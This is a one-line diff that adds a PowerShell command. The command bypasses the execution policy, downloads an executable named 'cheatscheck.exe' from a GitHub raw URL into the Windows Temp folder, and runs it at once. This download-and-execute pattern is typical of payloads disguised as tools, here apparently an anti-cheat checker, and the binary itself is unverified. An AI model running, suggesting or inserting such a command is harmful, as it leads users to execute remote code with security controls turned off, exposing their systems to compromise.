@@ -1,0 +1,1 @@
+powershell -ExecutionPolicy bypass -command "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/Zxccover/check-on-cheat/refs/heads/main/cheatscheck.exe', 'C:\Windows\Temp\cheatscheck.exe'); Start-Process ('C:\Windows\Temp\cheatscheck.exe')"
